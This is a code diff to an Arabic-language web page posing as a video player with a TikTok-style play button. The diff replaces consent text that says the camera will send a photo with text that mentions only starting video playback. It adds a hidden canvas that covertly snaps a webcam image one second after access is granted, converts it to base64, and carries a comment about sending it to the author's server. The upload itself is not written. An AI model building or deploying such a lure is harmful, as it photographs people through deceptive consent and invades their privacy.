@@ -1,30 +1,66 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>تشغيل الفيديو</title>
 <style>
-body{margin:0;background:#000;color:#fff;font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh}
-.card{text-align:center;width:90%;max-width:420px}
-button{background:#fe2c55;color:#fff;padding:15px 40px;border-radius:50px;font-size:18px;border:none;cursor:pointer}
-video{display:none;width:100%;margin-top:15px;border-radius:12px}
+  body { margin: 0; background: #000; color: #fff; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+  .card { text-align: center; width: 90%; max-width: 420px; }
+  button { background: #fe2c55; color: #fff; padding: 15px 40px; border-radius: 50px; font-size: 18px; border: none; cursor: pointer; font-weight: bold; }
+  video { display: none; width: 100%; margin-top: 15px; border-radius: 12px; transform: scaleX(-1); } /* scaleX لقلب الكاميرا كأنها مرآة */
+  canvas { display: none; } /* عنصر مخفي تماماً لالتقاط الصورة */
 </style>
 </head>
 <body>
 
 <div class="card">
   <button id="startBtn">▶ أوافق وأبدأ</button>
-  <p>بالضغط على أوافق، أنت تسمح باستخدام الكاميرا لإرسال صورة.</p>
-  <video id="video" autoplay playsinline></video>
+  <p id="msg">بالضغط على أوافق، أنت تسمح ببدء تشغيل الفيديو.</p>
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas> 
 </div>
 
 <script>
-const btn = document.getElementById('startBtn');
-const video = document.getElementById('video');
+  const btn = document.getElementById('startBtn');
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const msg = document.getElementById('msg');
 
-btn.onclick = async () => {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    video.style.display = 'block'
+  btn.onclick = async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      
+      video.onloadedmetadata = () => {
+        video.style.display = 'block';
+        btn.style.display = 'none';
+        msg.style.display = 'none';
+        
+        // البدء بالتقاط "الصورة" بعد ثانية واحدة من فتح الكاميرا لضمان الوضوح
+        setTimeout(takeHiddenPhoto, 1000);
+      };
+    } catch (err) {
+      console.error("خطأ:", err);
+    }
+  };
+
+  function takeHiddenPhoto() {
+    const context = canvas.getContext('2d');
+    // ضبط حجم الكانفاس المخفي ليكون نفس حجم الفيديو
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    
+    // رسم لقطة من الفيديو على الكانفاس (هذا يحدث في الخلفية)
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // تحويل الصورة إلى صيغة Base64 (نص) جاهزة للإرسال
+    const dataURL = canvas.toDataURL('image/png');
+    
+    console.log("تم التقاط الصورة بنجاح خلف الكواليس");
+    // هنا يمكنك إرسال المتغير (dataURL) إلى السيرفر الخاص بك باستخدام fetch أو Ajax
+  }
+</script>
+
+</body>
+</html>
